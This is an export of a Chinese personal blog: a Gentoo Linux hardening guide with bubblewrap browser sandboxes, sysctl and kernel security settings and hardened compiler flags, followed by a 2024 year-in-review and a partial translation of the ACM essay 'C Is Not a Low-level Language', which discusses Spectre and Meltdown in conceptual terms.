$HOME/Downloads $HOME/Downloads \\ --setenv GTK_THEME Papirus:light \\ --setenv MOZ_ENABLE_WAYLAND 1 \\ --setenv PATH /usr/bin \\ --hostname RESTRICTED \\ --unshare-all \\ --share-net \\ --die-with-parent \\ --new-session \\ /usr/bin/firefox $@ Chromium 的编译时间实在太长了（虽然 FireFox 的也没差到哪去，开启了 LTO 和 PGO 之后编译时间感人），我又用回来了这位 由于我有了其他软件从系统默认浏览器打开链接的需求，所以就用 xdg-dbus-proxy 设置了相关服务，并且我 waybar 的 mpris 组件也能显示 FireFox 播放的媒体了。 我使用了 nvidia-vaapi-driver，所以设备上暴露了一些 nvidia 的，这个 /dev/nvidia-uvm 一开始是没有的，我运行了 vainfo 之后就会出现，所以现在有一个抽象的事情就是我会先在 foot 上执行一遍 vainfo，之后打开 FireFox。这套是可以用上 nvidia-vaapi-driver 的硬件视频解码的，如果 FireFox 能支持 nvenc 就更好了。 ","date":"2025-01-07","objectID":"/posts/gentoo_hardened_guide/:3:1","tags":["gentoo-linux","linux"],"title":"Gentoo Linux 安全加固指南","uri":"/posts/gentoo_hardened_guide/"},{"categories":null,"content":"VSCodium vscodium 基本照搬的 下面的 Chromium 的配置 bwrap \\ --symlink usr/lib /lib \\ --symlink usr/lib64 /lib64 \\ --symlink usr/bin /bin \\ --symlink usr/bin /sbin \\ --ro-bind /usr/bin /usr/bin \\ --ro-bind /usr/lib /usr/lib \\ --ro-bind /usr/lib64 /usr/lib64 \\ --ro-bind /usr/share/applications /usr/share/applications \\ --ro-bind /usr/share/gtk-3.0 /usr/share/gtk-3.0 \\ --ro-bind /usr/share/icu /usr/share/icu \\ --ro-bind /usr/share/drirc.d /usr/share/drirc.d \\ --ro-bind /usr/share/fonts /usr/share/fonts \\ --ro-bind /usr/share/glib-2.0 /usr/share/glib-2.0 \\ --ro-bind /usr/share/glvnd /usr/share/glvnd \\ --ro-bind /usr/share/icons /usr/share/icons \\ --ro-bind /usr/share/mime /usr/share/mime \\ --ro-bind /usr/share/X11/xkb /usr/share/X11/xkb \\ --ro-bind /usr/share/icons /usr/share/icons \\ --ro-bind /usr/share/locale /usr/share/locale \\ --ro-bind /usr/share/zoneinfo /usr/share/zoneinfo \\ --ro-bind /usr/share/vulkan /usr/share/vulkan \\ --ro-bind /usr/share/verilator /usr/share/verilator \\ --ro-bind /usr/include /usr/include \\ --ro-bind /etc/ssl /etc/ssl \\ --ro-bind /etc/ca-certificates.conf /etc/ca-certificates.conf \\ --ro-bind /etc/fonts /etc/fonts \\ --ro-bind /etc/resolv.conf /etc/resolv.conf \\ --ro-bind /etc/chromium /etc/chromium \\ --ro-bind /etc/localtime /etc/localtime \\ --ro-bind /etc/ld.so.conf /etc/ld.so.conf \\ --ro-bind /etc/ld.so.cache /etc/ld.so.cache \\ --ro-bind /opt/vscodium/ /opt/vscodium/ \\ --dir \"$XDG_RUNTIME_DIR\" \\ --ro-bind \"$XDG_RUNTIME_DIR/wayland-1\" \"$XDG_RUNTIME_DIR/wayland-1\" \\ --dev /dev \\ --dev-bind /dev/dri /dev/dri \\ --ro-bind /sys/dev/char /sys/dev/char \\ --ro-bind /sys/devices/pci0000:00 /sys/devices/pci0000:00 \\ --proc /proc \\ --tmpfs /tmp \\ --bind $HOME/.config/VSCodium $HOME/.config/VSCodium \\ --bind $HOME/.vscode-oss $HOME/.vscode-oss \\ --bind $HOME/Downloads $HOME/Downloads \\ --bind $HOME/Documents $HOME/Documents \\ --bind $HOME/codpjt $HOME/codpjt \\ --bind $HOME/git_repo $HOME/git_repo \\ --setenv GTK_THEME Papirus:light \\ --hostname RESTRICTED \\ --unshare-all \\ --share-net \\ --new-session \\ /opt/vscodium/codium --ozone-platform=wayland --use-gl=angle --use-angle=vulkan --enable-features=AcceleratedVideoEncoder,AcceleratedVideoDecodeLinuxGL,VaapiOnNvidiaGPUs,VaapiIgnoreDriverChecks,Vulkan,DefaultANGLEVulkan,VulkanFromANGLE --ignore-gpu-blocklist --disable-gpu-driver-bug-workaround --enable-wayland-ime ","date":"2025-01-07","objectID":"/posts/gentoo_hardened_guide/:3:2","tags":["gentoo-linux","linux"],"title":"Gentoo Linux 安全加固指南","uri":"/posts/gentoo_hardened_guide/"},{"categories":null,"content":"Chromium bwrap \\ --symlink usr/lib /lib \\ --symlink usr/lib64 /lib64 \\ --symlink usr/bin /bin \\ --symlink usr/bin /sbin \\ --ro-bind /usr/lib /usr/lib \\ --ro-bind /usr/lib64 /usr/lib64 \\ --ro-bind /usr/bin /usr/bin \\ --ro-bind /etc/ssl /etc/ssl \\ --ro-bind /etc/ca-certificates.conf /etc/ca-certificates.conf \\ --ro-bind /etc/fonts /etc/fonts \\ --ro-bind /etc/resolv.conf /etc/resolv.conf \\ --ro-bind /etc/chromium /etc/chromium \\ --ro-bind /etc/localtime /etc/localtime \\ --ro-bind /etc/ld.so.conf /etc/ld.so.conf \\ --ro-bind /etc/ld.so.cache /etc/ld.so.cache \\ --ro-bind /usr/share/applications /usr/share/applications \\ --ro-bind /usr/share/gtk-3.0 /usr/share/gtk-3.0 \\ --ro-bind /usr/share/icu /usr/share/icu \\ --ro-bind /usr/share/drirc.d /usr/share/drirc.d \\ --ro-bind /usr/share/fonts /usr/share/fonts \\ --ro-bind /usr/share/glib-2.0 /usr/share/glib-2.0 \\ --ro-bind /usr/share/glvnd /usr/share/glvnd \\ --ro-bind /usr/share/icons /usr/share/icons \\ --ro-bind /usr/share/mime /usr/share/mime \\ --ro-bind /usr/share/X11/xkb /usr/share/X11/xkb \\ --ro-bind /usr/share/icons /usr/share/icons \\ --ro-bind /usr/share/mime /usr/share/mime \\ --ro-bind /usr/share/zoneinfo /usr/share/zoneinfo \\ --ro-bind /usr/share/pixmaps /usr/share/pixmaps \\ --ro-bind /usr/share/locale /usr/share/locale \\ --ro-bind /usr/share/vulkan /usr/share/vulkan \\ --dev /dev \\ --dev-bind /dev/dri /dev/dri \\ --proc /proc \\ --ro-bind /sys/dev/char /sys/dev/char \\ --ro-bind /sys/devices/pci0000:00 /sys/devices/pci0000:00 \\ --ro-bind /run/dbus /run/dbus \\ --dir \"$XDG_RUNTIME_DIR\" \\ --ro-bind \"$XDG_RUNTIME_DIR/wayland-1\" \"$XDG_RUNTIME_DIR/wayland-1\" \\ --ro-bind \"$XDG_RUNTIME_DIR/pipewire-0\" \"$XDG_RUNTIME_DIR/pipewire-0\" \\ --ro-bind \"$XDG_RUNTIME_DIR/pulse\" \"$XDG_RUNTIME_DIR/pulse\" \\ --tmpfs /tmp \\ --dir $HOME/.cache \\ --bind $HOME/.config/chromium $HOME/.config/chromium \\ --bind $HOME/Downloads $HOME/Downloads \\ --unshare-all \\ --share-net \\ --die-with-parent \\ --new-session \\ /usr/bin/chromium 使用 FireFox 的时候还在用我的 NVIDIA 显卡驱动，由于 FireFox 官方并不支持 NVENC 视频解码（虽然可以通过安装 media-libs/nvidia-vaapi-driver 实现翻译） 由于使用 FireFox 打开部分网站速度不佳，我选择了 Chromium（由于 media-libs/libpng 依赖问题，我把 FireFox 删除了） 使用 Chromium 的时候是 Intel 的核显驱动，安装了 media-libs/libva-intel-media-driver 软件包，这套 bwrap 参数可以让 Chromium 用到显卡的视频解码，由于 Gentoo 的 Chromium 会读取 /etc/chromium/ 下的文件作为 Chromium 启动时的命令行参数，所以我把参数都放到那里了 我这套选项可能有的有些多余，不过我懒得再裁剪了 --ozone-platform=wayland --use-gl=angle --use-angle=vulkan --enable-features=AcceleratedVideoEncoder,AcceleratedVideoDecodeLinuxGL,VaapiOnNvidiaGPUs,VaapiIgnoreDriverChecks,Vulkan,DefaultANGLEVulkan,VulkanFromANGLE --ignore-gpu-blocklist --disable-gpu-driver-bug-workaround --enable-wayland-ime --wayland-text-input-version=3 ","date":"2025-01-07","objectID":"/posts/gentoo_hardened_guide/:3:3","tags":["gentoo-linux","linux"],"title":"Gentoo Linux 安全加固指南","uri":"/posts/gentoo_hardened_guide/"},{"categories":null,"content":"sysctl 我参考了一些文章给出的 sysctl 配置，新建目录 /etc/sysctl.d/，并新建文件 99-hardened.conf，文件内容如下： kernel.core_pattern=|/bin/false kernel.kptr_restrict=2 kernel.dmesg_restrict=1 kernel.unprivileged_bpf_disabled=1 net.core.bpf_jit_harden=2 dev.tty.ldisc_autoload=0 vm.unprivileged_userfaultfd=0 kernel.kexec_load_disabled=1 kernel.sysrq=4 net.ipv4.tcp_syncookies=1 net.ipv4.tcp_rfc1337=1 net.ipv4.tcp_timestamps=0 net.ipv4.conf.all.rp_filter=1 net.ipv4.conf.default.rp_filter=1 net.ipv4.conf.all.accept_redirects=0 net.ipv4.conf.default.accept_redirects=0 net.ipv4.conf.all.secure_redirects=0 net.ipv4.conf.default.secure_redirects=0 net.ipv6.conf.all.accept_redirects=0 net.ipv6.conf.default.accept_redirects=0 net.ipv4.conf.all.send_redirects=0 net.ipv4.conf.default.send_redirects=0 net.ipv4.icmp_echo_ignore_all=1 net.ipv4.conf.all.accept_source_route=0 net.ipv4.conf.default.accept_source_route=0 net.ipv6.conf.all.accept_source_route=0 net.ipv6.conf.default.accept_source_route=0 net.ipv6.conf.all.use_tempaddr=2 net.ipv6.conf.default.use_tempaddr=2 net.ipv6.conf.all.accept_ra=0 net.ipv6.conf.default.accept_ra=0 kernel.yama.ptrace_scope=1 vm.mmap_rnd_bits=32 vm.mmap_rnd_compat_bits=16 fs.protected_symlinks=1 fs.protected_hardlinks=1 fs.protected_fifos=2 fs.protected_regular=2 kernel.yama.ptrace_scope=1 貌似是默认的？为了更安全可以选择 2 或 3，我印象中 2 是不允许非 root 用户做这件事，而 3 这是不允许该行为 我设置为 1 是允许父子进程关系才可以查看进程的内存和运行状态等信息，这是因为我仍然有调试软件的需求，如果没有的话设置死也是个选择 🤔 可以安装 checksec 查看当前运行的 kernel 的安全性（当然，该工具检查的并不全面） $ checksec --kernel * Kernel protection information: Description - List the status of kernel protection mechanisms. Rather than inspect kernel mechanisms that may aid in the prevention of exploitation of userspace processes, this option lists the status of kernel configuration options that harden the kernel itself against attack. Kernel config: /proc/config.gz Vanilla Kernel ASLR: Full NX protection: Enabled Protected symlinks: Enabled Protected hardlinks: Enabled Protected fifos: Enabled Protected regular: Enabled Ipv4 reverse path filtering: Enabled Kernel heap randomization: Enabled GCC stack protector support: Enabled GCC stack protector strong: Enabled SLAB freelist randomization: Enabled Virtually-mapped kernel stack: Enabled Restrict /dev/mem access: Enabled Restrict I/O access to /dev/mem: Enabled Exec Shield: Unsupported YAMA: Active Hardened Usercopy: Enabled Harden str/mem functions: Enabled * X86 only: Address space layout randomization: Enabled * SELinux: Disabled SELinux infomation available here: http://selinuxproject.org/ 这里除了 SELinux 没有开启之外，其他都是通过检查的 印象中还有一个项目，它检查内核配置比这个更全面，除了基本的这些之外，还有 KSPP (Kenrel Self Protection Project) 和 PAX 等项目的建议，不过我没用它 checksec 还可以检查指定的可执行文件的安全配置情况 $ checksec --file=/usr/bin/sway RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE Full RELRO Canary found NX enabled PIE enabled No RPATH No RUNPATH No Symbols Partial 9 18 /usr/bin/sway ","date":"2025-01-07","objectID":"/posts/gentoo_hardened_guide/:4:0","tags":["gentoo-linux","linux"],"title":"Gentoo Linux 安全加固指南","uri":"/posts/gentoo_hardened_guide/"},{"categories":null,"content":"内核命令行参数 page_alloc.shuffle=1 pti=on vsyscall=none module.sig_enforce=1 lockdown=confidentiality quiet loglevel=0 intel_iommu=on amd_iommu=force_isolation efi=disable_early_pci_dma iommu=force iommu.passthrough=0 iommu.strict=1 spectre_v2=on spec_store_bypass_disable=on tsx=off tsx_async_abort=full mds=full l1tf=full,force kvm.nx_huge_pages=force 第一行中的启动参数是开启一些常见的安全防护机制，比如页表隔离，模块签名验证等，其实有更多的参数可以写，比如 slab_nomerge 和 randomize_kstack_offset=on 这些，不过由于我使用的内核是 hardened USE 变量的 gentoo-kernel，这些已经在编译的时候开启了，我就不在这里写了 第二行是开启一些 IOMMU 防护 第三行是开启 Spectre 等 CPU 漏洞的缓解机制 如果要检查当前运行的 CPU 是否受到已知漏洞的影响，可以运行 $ grep -r . /sys/devices/system/cpu/vulnerabilities/ ","date":"2025-01-07","objectID":"/posts/gentoo_hardened_guide/:5:0","tags":["gentoo-linux","linux"],"title":"Gentoo Linux 安全加固指南","uri":"/posts/gentoo_hardened_guide/"},{"categories":null,"content":"NetworkManager NetworkManager 是目前大多数用户使用的桌面环境都在用的网络管理工具，它既可以管理有线网络，也可以管理无线网络。 应该开启 NetworkManager 的 MAC 地址随机化 在 /etc/NetworkManager/conf.d/ 下创建 99-macrandomize.conf [device] wifi.scan-rand-mac-address=yes [connection] wifi.cloned-mac-address=random ethernet.cloned-mac-address=random 我使用的是 Hyprland 窗口管理器，这些窗口管理器基本都有一个缺陷 —— 没有自家的 keyring 服务（GNOME 有 gnome-keyring，KDE Plasma 有 kwallet） 我安装了 gnome-base/gnome-keyring，并且运行了 systemctl --user enable --now gnome-keyring-daemon 之后我安装了 gnome-extra/nm-applet 用来连接 WIFI，并使用网络编辑，在 WIFI 安全性中改成仅为该用户存储密码 如果要安装 gnome-extra/nm-applet 的话，最好启用 appindicator USE 变量 之后是开启 IPV6 隐私扩展 新建 /etc/NetworkManager/conf.d/ip6-privacy.conf，其内容为 [connection] ipv6.ip6-privacy=2 在 /etc/NetworkManager/system-connections/ 下编辑已有的连接 ... [ipv6] method=auto ip6-privacy=2 ... 添加这个 ip6-privacy=2 ","date":"2025-01-07","objectID":"/posts/gentoo_hardened_guide/:6:0","tags":["gentoo-linux","linux"],"title":"Gentoo Linux 安全加固指南","uri":"/posts/gentoo_hardened_guide/"},{"categories":null,"content":"浏览器配置 FireFox 我推荐 arkenfox/user.js 项目，搭配 uBlock Origin 如果为了防止被网站跟踪，可以选择使用 Mullvad Browser，这位是和 Tor Project 联合开发，并去除了 Tor 的部分 Chromium 的话，我选择根据 Policy Templates 配置一些策略 { \"PrivacySandboxAdMeasurementEnabled\": false, \"PrivacySandboxAdTopicsEnabled\": false, \"PrivacySandboxPromptEnabled\": true, \"PrivacySandboxSiteEnabledAdsEnabled\": false, \"AudioSandboxEnabled\": true, \"NetworkServiceSandboxEnabled\": true, \"AutoplayAllowed\": false, \"BlockThirdPartyCookies\": true, \"SavingBrowserHistoryDisabled\": true, \"EncryptedClientHelloEnabled\": true, \"HttpsUpgradesEnabled\": true, \"WebRtcIPHandling\": \"disable_non_proxied_udp\", \"SafeBrowsingEnabled\": true, \"SafeBrowsingProtectionLevel\": 2, \"SafeBrowsingProxiedRealTimeChecksAllowed\": true, \"CACertificateManagementAllowed\": 2 } 写完可以用 jq 验证一下 JSON 格式对不对 cat test.json | jq 我在 Chromium 上依旧在使用 uBlock Origin，也不知道 Chromium 什么时候开始停止支持 Mainfest V2 标准的浏览器扩展 ","date":"2025-01-07","objectID":"/posts/gentoo_hardened_guide/:7:0","tags":["gentoo-linux","linux"],"title":"Gentoo Linux 安全加固指南","uri":"/posts/gentoo_hardened_guide/"},{"categories":null,"content":"禁用 core dump 禁用 core dump 貌似是为了防止有写私密数据也被 dump 下来了。不过就我个人而言，我只是很讨厌这种在我不知道的时候 dump 的行为，不知不觉运行 coredumpctl 一看，python、firefox 这些软件都 dump 过，难绷。 新建 /etc/systemd/coredump.conf.d/disable.conf 中写入 [Coredump] Storage=none ProcessSizeMax=0 上面 sysctl 的 kernel.core_pattern=|/bin/false 也是在禁用 core dump 不得不说，禁用了之后，我自己开发的软件 core dump 了也没存。有一说一，core dump 还是有助于开发的，等之后我手动临时开启试试看吧。 ","date":"2025-01-07","objectID":"/posts/gentoo_hardened_guide/:8:0","tags":["gentoo-linux","linux"],"title":"Gentoo Linux 安全加固指南","uri":"/posts/gentoo_hardened_guide/"},{"categories":null,"content":"面向安全的编译选项 在我最先写这个文章的时候，我就想写这部分，但是由于我对 GCC 和 LLVM 的了解还太少，导致我有些迟疑（当然，现在也了解不多，只是感觉应该加上而已） COMMON_FLAGS=\"-O3 -pipe -march=x86-64-v3 -flto=thin -fstack-protector-strong -fstack-clash-protection -fcf-protection=full -D_FORTIFY_SOURCE=3\" RUSTFLAGS=\"${RUSTFLAGS} -C target-cpu=native\" CFLAGS=\"${COMMON_FLAGS}\" CXXFLAGS=\"${COMMON_FLAGS}\" FCFLAGS=\"${COMMON_FLAGS}\" FFLAGS=\"${COMMON_FLAGS}\" LDFLAGS=\"-Wl,-O3,-z,now,--as-needed,--lto-O3,--icf=safe,--gc-sections\" 我使用的是 LLVM/systemd profile，所以这里用了 thinlto 上面就是我个人的编译选项了，我本身就开启了 hardened USE 变量，说实话，这里的部分 USE 变量是重复的 只要开启了 hardened USE 变量，这里面有些选项是默认就加上的 运行 clang --version 可以看到 Configuration file: /etc/clang/x86_64-pc-linux-gnu-clang.cfg 从那个文件中可以看到它依赖于 @gentoo-common.cfg @gentoo-common-ld.cfg 和 @gentoo-cet.cfg 我这里的 -fstack-clash-protection -fstack-protector-strong -fcf-protection=all 在在上面的文件中 fstack-protector-* 都是对栈溢出的防御，而 fcf-protection 则是对控制流劫持（也不知道是不是这个名字，就是 ROP 之类的）攻击的防御 LLVM 中也有一个应对 ROP 这种攻击的技术，就是 CFI，CFI 必须在开启了 LTO 的情况下才能使用（我印象中 KCFI 不需要 LTO，它被用在操作系统内核等底层软件，检测的范围更小），我感觉为特定的软件开 CFI，倒也可以接受。Linux kernel 有专门的 CFI 的选项，Chromium 也实施了 CFI。 CFI 还分前端和后端，我也没太仔细研究，也不太清楚区别 我使用了 O3 编译，虽然说 O3 的提升空间不大，不过我个人希望试试看。 march=x86-64-v3 表示了我本机 CPU 的指令集是这位，其实用 march=native 就行，编译器会自动选择适合的指令集 D_FORTIFY_SOURCE=3 用于应用 libc 的一种强化措施，主要用于检测某些库函数的缓冲区溢出问题。具体可以参考 glibc 的文档：https://www.gnu.org/software/libc/manual/html_node/Source-Fortification.html ","date":"2025-01-07","objectID":"/posts/gentoo_hardened_guide/:9:0","tags":["gentoo-linux","linux"],"title":"Gentoo Linux 安全加固指南","uri":"/posts/gentoo_hardened_guide/"},{"categories":null,"content":"SELinux/AppArmor TODO 我自己还没太准备学习这二位 ","date":"2025-01-07","objectID":"/posts/gentoo_hardened_guide/:10:0","tags":["gentoo-linux","linux"],"title":"Gentoo Linux 安全加固指南","uri":"/posts/gentoo_hardened_guide/"},{"categories":null,"content":"2024 年终总结","date":"2024-12-31","objectID":"/posts/2024_review/","tags":["life"],"title":"2024 年终总结","uri":"/posts/2024_review/"},{"categories":null,"content":"2024 年终总结 今年总体来说并不太好 ","date":"2024-12-31","objectID":"/posts/2024_review/:0:0","tags":["life"],"title":"2024 年终总结","uri":"/posts/2024_review/"},{"categories":null,"content":"刷课进度 从年初开始看，我在寒假期间终于把 MIT 6.1810: Operating System Engineering 的 lab 刷的差不多了，并看了 CS106L，初步了解了 modern C++。 后来想要刷 CMU 15445 那个数据库的课，不过没怎么动，所以这个课就教给我了两个东西：CMake 的使用和 Google Test 测试框架。我将它们引入到了我在 2023 年编写的命令行程序 ReleaseButler 中。 我现在把我希望刷的课，都列到了关于界面 ","date":"2024-12-31","objectID":"/posts/2024_review/:1:0","tags":["life"],"title":"2024 年终总结","uri":"/posts/2024_review/"},{"categories":null,"content":"为了操作系统尽可能安全，我的尝试 今年了解到了 xz-utils 后门，这让我直到现在都在找一个日常使用 Linux 发行版的安全和好用的平衡。 目前来说，我认为安全做的最好的应该是 Google Pixel + GrapheneOS，Chromebook 也还行。桌面端的我认为都不是很行，我一直很期待存储空间隔离的功能，但貌似只有 GrapheneOS 实现了。 处于这个目的，我尝试了 Qubes OS，不过还是用不太习惯。我目前在使用 Fedora Silverblue + Windows 双系统，主力开发目前是 Windows 这里，我希望毕业后装一个 AMD GPU 的电脑，这样就只装 mesa 就好了，也不需要考虑 nvidia-driver 的一些问题（比如不支持 musl libc，安全启动还需要额外导一遍密钥等）。 我现在感觉 Windows 的安全性做的也还不错，不过市场占有率在这，更多的安全研究员会盯着 Windows。 所以有一句话说的还有点道理，用冷门的东西更安全（ 为了达到“保证日常可用的前提下尽可能的安全”的目标，我尝试了 Gentoo Linux，这是因为我并不完全了解某些发行版的软件构建过程，索性就在自己的电脑上跑得了。在使用 Gentoo Linux 的过程中，我特地搜索了什么编译选项用于获得更好的安全性和性能。我将它们都记录在 Gentoo_portage。 使用 Gentoo Linux 的时候，我选择了 LLVM profile，因为听说会提升编译速度（这个我没感知到），还有就是我跟喜欢 LLVM 的一些工具（clang-tidy、clang-format）。实际上我倾向于自己编译内核（开启 CFI 选项）。Linux kernel 只有在使用 Clang/LLVM 编译时在可以在编译时使用 CFI。我感觉大部分发行版都没开启 CFI 啊。 我尝试了 musl libc + LLVM profile，这是因为听说 musl libc 不像 glibc 存在 GNU 自己的扩展，所以代码更加干净，攻击面也更小。但不得不说，我在尝试了之后才知道 glibc 的地位，systemd 和 chromium 居然还蛮依赖 glibc 的（Gentoo wiki 的解释是 systemd 依赖于 glibc，chromium 需要做很多修改才能在 musl libc 上使用）。由于 visual studio code 无法使用，导致我没再使用这个 profile（虽然可以使用 flatpak 安装它），不过现在我的 Fedora Silverblue 也是用 flatpak 安装的 visual studio code，也许这对我来说将不再是问题？ 后来我感觉 Gentoo Linux 的项目开发人员不是特别够，部分不怎么重量级的包还处于没人维护的状态（但它居然还在官方软件仓库里）。目前我倾向于使用 Fedora/OpenSUSE 等，等我有个性能好的电脑再装 Gentoo Linux。 我现在开始倾向于使用操作系统提供的硬盘加密功能，我认为这是必需的步骤。 ","date":"2024-12-31","objectID":"/posts/2024_review/:2:0","tags":["life"],"title":"2024 年终总结","uri":"/posts/2024_review/"},{"categories":null,"content":"开源相关 在学长的推荐下，我报名了今年的开源之夏，并成功申请到了一个项目并成功结项。 在 B 站上看到了 LCPU Getting Started，我还尝试给这个项目的网站添加了一点小东西，后来看到他们貌似准备这个是他们校内组织来维护，顿时有些抱歉（ ","date":"2024-12-31","objectID":"/posts/2024_review/:3:0","tags":["life"],"title":"2024 年终总结","uri":"/posts/2024_review/"},{"categories":null,"content":"一生一芯 我花了两周把一生一芯的预学习部分写完了，不过由于当时我很不想用 Windows，但是 Hyprland 作为使用 Wayland 的窗口管理器，无法很好的让腾讯会议运行，我就没去参加入学答辩，我准备在一月初考完试再改一改，之后参加入学答辩。 争取毕业前整完 ","date":"2024-12-31","objectID":"/posts/2024_review/:4:0","tags":["life"],"title":"2024 年终总结","uri":"/posts/2024_review/"},{"categories":null,"content":"博客开的坑 我想要把 xv6-riscv 看一下，并形成个源码阅读的系列文章，不过目前就完成了用户态的部分。 ","date":"2024-12-31","objectID":"/posts/2024_review/:5:0","tags":["life"],"title":"2024 年终总结","uri":"/posts/2024_review/"},{"categories":null,"content":"实习 找寒假实习失败 准备在寒假再面一下 PLCT 实验室的实习 ","date":"2024-12-31","objectID":"/posts/2024_review/:6:0","tags":["life"],"title":"2024 年终总结","uri":"/posts/2024_review/"},{"categories":null,"content":"未来展望 希望面试顺利，一生一芯的完成顺利 有机会学一下 Rust ","date":"2024-12-31","objectID":"/posts/2024_review/:7:0","tags":["life"],"title":"2024 年终总结","uri":"/posts/2024_review/"},{"categories":null,"content":"一篇题为 C Is Not a Low-level Language 的译文","date":"2024-12-19","objectID":"/posts/c_not_low_level/","tags":["C"],"title":"译文: C 不是一个底层编程语言","uri":"/posts/c_not_low_level/"},{"categories":null,"content":"译文: C 不是一个底层编程语言，你的计算机也并不是 PDP-11 翻译自: https://queue.acm.org/detail.cfm?id=3212479 来源于 ACM 的一篇文章，如果介意翻译转载，需要删除掉，可以选择以一些我能看到的方式（如评论）告知我 在 Meltdown 和 Spectre 漏洞出现后，我们应该花一些时间去研究其根本原因。这两个漏洞都涉及处理器推测执行绕过某种访问检查的指令，并允许攻击者通过侧信道观察结果。导致这些漏洞的特性，以及其他一些类似特性，都是为了让 C 语言的程序员继续相信他们是在用一种底层编程语言编程，而实际上，这种情况已经不复存在了几十年。 处理器供应商并不是导致这一切的罪魁祸首。我们这些从事 C/C++ 编译器开发的人分了一杯羹。 Spectre 和 Meltdown 是大部分现代 CPU 都存在的漏洞。 现代 CPU 都会利用分支预测和推测执行来提高性能。这里说的推测执行（speculative execution）是程序在执行到条件判断语句（如 if），并且该条件需要通过从内存中读取数据时，CPU 会先尝试执行某个分支的代码，并且这会绕过一些安全性检查。如果读取了内存的值发现真的要执行这个分支，就接着往后走。如果发现并不应该执行这个分支，就把状态恢复到之前的样子，并执行应该执行的分支。 虽然我们希望执行错误的分支后应该恢复到执行前的状态，但实际上可能会有一些副作用残留。Spectre 利用了这一点，将一些不可读的数据提前加载到缓存中，方便后续读取。 Spectre 不易修复，它指代的是一类的漏洞，直到今年（也就是 2024 年），依旧可以看到它。Spectre 依赖于对芯片行为的研究，开发者需要诱导 CPU 认为应该执行分支里的代码。 如果想了解更多，可以参考 Meltdown 和 Spectre 的论文: Meltdown 和 Spectre Attacks: Exploiting Speculative Execution ","date":"2024-12-19","objectID":"/posts/c_not_low_level/:0:0","tags":["C"],"title":"译文: C 不是一个底层编程语言","uri":"/posts/c_not_low_level/"},{"categories":null,"content":"什么是底层编程语言 计算机科学先驱 Alan Perlis 是这样定义底层编程语言的： “当编程语言的程序需要关注无关紧要的内容时，它就是底层编程语言。” A programming language is low level when its programs require attention to the irrelevant 虽然这个定义确实适用于 C，但它并没有回应人们对底层编程语言的期望。有很多方面会使人们将一种语言视为底层编程语言。可以将编程语言想象为一个连续体，一端是汇编语言，另一端是《星际迷航》中星舰计算机的接口。底层编程语言“接近硬件”，而高级语言更接近人类的思维方式。 要使一种语言“接近硬件”，它必须提供一种抽象机器，这种抽象能够轻松映射到目标平台所暴露的抽象上。可以很容易地说，C 对于 PDP-11 来说是一种底层编程语言。两者都描述了一种模型：程序按顺序执行，内存是一个平坦的空间，甚至前置和后置自增操作符都与 PDP-11 的寻址模式完美契合。 ","date":"2024-12-19","objectID":"/posts/c_not_low_level/:1:0","tags":["C"],"title":"译文: C 不是一个底层编程语言","uri":"/posts/c_not_low_level/"},{"categories":null,"content":"PDP-11 仿真器 Spectre 和 Meltdown 漏洞的根本原因在于，处理器架构师试图构建的不仅仅是高效的处理器，而是能够暴露与 PDP-11 相同抽象机器的高效处理器。这一点至关重要，因为它让 C 程序员能够继续相信他们的语言与底层硬件非常接近。 C 代码提供了一个大部分是串行的抽象机器（直到 C11，如果排除非标准供应商扩展，它是一个完全串行的机器）。创建新线程是一个已知开销较大的操作，因此希望保持执行单元忙碌运行 C 代码的处理器依赖于 ILP（指令级并行性）。它们检查相邻的操作并并行发出独立的指令。这为允许程序员编写主要是顺序的代码增加了大量复杂性（和功耗）。相比之下，GPU 在没有任何这些逻辑的情况下实现了非常高的性能，代价是需要显式并行的程序。 对高 ILP 的追求是 Spectre 和 Meltdown 漏洞的直接原因。现代 Intel 处理器一次最多可以有 180 条指令在执行（与顺序 C 抽象机器形成鲜明对比，后者期望每个操作在下一个开始之前完成）。对于 C 代码的典型启发式方法是，每七条指令就有一个分支。如果你希望通过单个线程保持一个 pipeline 满载的情况，那么你必须猜测接下来 25 个分支的目标。这再次增加了复杂性；这也意味着错误的猜测会导致工作被执行后又被丢弃，这对于功耗并不理想。这些被丢弃的工作会产生可见的副作用，Spectre 和 Meltdown 攻击正是利用了这些副作用。 在现代处理器中，寄存器重命名引擎（register rename engine）是最大的芯片面积和功耗消耗者之一。更糟糕的是，在任何指令运行时，它不能被关闭或断电，这使得它在暗硅时代变得不方便，因为晶体管便宜，但有电的晶体管却是昂贵的资源。这个单元在 GPU 上显著缺失，在 GPU 上并行性来自多个线程，而不是试图从本质上是标量的代码中提取指令级并行性。如果指令之间没有需要重排的依赖关系，那么寄存器重命名就不是必需的。 再考虑 C 抽象机器内存模型的另一个核心部分：flat memory。这种情况已经有二十多年不再成立。现代处理器通常在寄存器和主内存之间有三个级别的缓存，这些缓存试图隐藏延迟。 缓存是对程序员隐藏的，因此在 C 语言中是不可见的。高效利用缓存是让代码在现代处理器上运行快速的最重要方法之一，但这一点完全被隐藏，程序员必须依赖于了解缓存的实现细节（例如，两个 64 字节对齐的值可能会最终位于同一缓存行）来编写高效的代码。 ","date":"2024-12-19","objectID":"/posts/c_not_low_level/:2:0","tags":["C"],"title":"译文: C 不是一个底层编程语言","uri":"/posts/c_not_low_level/"},{"categories":null,"content":"C 的优化 底层编程语言的一个常见特性是它们很快。特别是，它们应该能够轻松地转化为运行高效的代码，而不需要特别复杂的编译器。在谈论其他语言时，C 的支持者常常否定“足够聪明的编译器能够使某个编程语言的代码变得高效”这一论点。 不幸的是，简单的翻译并不能为 C 提供高效的代码。尽管处理器架构师在设计能够高效运行 C 代码的芯片方面付出了巨大的努力，但 C 程序员期望的性能水平只有通过极其复杂的编译器转换才能实现。Clang 编译器，包括 LLVM 的相关部分，约有 200 万行代码。仅仅是为了让 C 运行得更快所需的分析和转换阶段就已累积近 20 万行代码（不包括注释和空行）。 例如，在 C 中，处理大量数据意味着编写一个按顺序处理每个元素的循环。为了在现代 CPU 上优化运行，编译器首先必须确定循环迭代是独立的。C 中的 restrict 关键字可以在这里提供帮助。它保证通过一个指针写入的数据不会干扰通过另一个指针读取的数据（或者如果干扰发生，程序员可以接受程序给出意外结果）。相比于 Fortran 等语言，这些信息要有限得多，这也是 C 没能取代 Fortran 在高性能计算中地位的一个重要原因。 一旦编译器确定了循环迭代是独立的，下一步就是尝试对结果进行向量化，因为现代处理器在向量代码中的吞吐量是标量代码的四到八倍。对于这种处理器，底层编程语言将具有任意长度的原生向量类型。LLVM IR恰好具备这一特性，因为将一个大的向量操作拆分成更小的操作总比构造更大的向量操作要容易。 